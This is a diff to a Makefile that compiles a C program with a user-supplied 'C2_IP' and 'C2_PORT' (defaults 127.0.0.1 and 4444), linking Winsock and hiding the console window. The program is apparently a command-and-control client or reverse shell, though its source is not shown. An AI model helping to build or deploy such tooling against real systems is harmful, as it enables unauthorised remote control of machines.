@@ -2,24 +2,30 @@ CC = gcc
 SRC = main.c
 TARGET = mapp
 BIN = $(TARGET)
+l = ""
 
 .PHONY: all clean
 
+L = (
+R = )
+
 define wininput
 ifeq ($(C2_IP),)
-C2_IP:=$(shell cmd /v:on /c "set /p X=IP: >con & echo !X!")
+C2_IP := $$(shell cmd /v:on /c "$(L)set t=127.0.0.1$(R) & set /p t=IP$(L)127.0.0.1$(R): >con & echo.!t!")
 endif
+
 ifeq ($(C2_PORT),)
-C2_PORT:=$(shell cmd /v:on /c "set /p X=PORT: >con & echo !X!")
+C2_PORT := $$(shell cmd /v:on /c "$(L)set t=4444$(R) & set /p t=PORT$(L)4444$(R): >con & echo.!t!")
 endif
 endef
 
+
 define uninput
 ifeq ($(C2_IP),)
-C2_IP := $$(shell sh -c 'read -p "IP: " t; echo $$$$t')
+C2_IP := $$(shell read -p "IP$(L)127.0.0.1$(R): " t; echo $${t:-127.0.0.1})
 endif
 ifeq ($(C2_PORT),)
-C2_PORT := $$(shell sh -c 'read -p "PORT: " t; echo $$$$t')
+C2_PORT := $$(shell read -p "PORT$(L)4444$(R): " t; echo $${t:-4444})
 endif
 endef
 
@@ -42,7 +48,7 @@ else
 ifeq ($(findstring MSYS_NT,$(shell uname -s)),MSYS_NT) # MSYS/MSYS2
 	$(CC) $(SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
 endif
-ifeq ($(shell uname -s),Windows_NT) # W32/64devkit
+ifeq ($(findstring Windows_NT,$(shell uname -s)),Windows_NT) # W32/64devkit
 	$(CC) $(SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
 endif
 ifeq ($(findstring CYGWIN_NT,$(shell uname -s)),CYGWIN_NT) # Cygwin
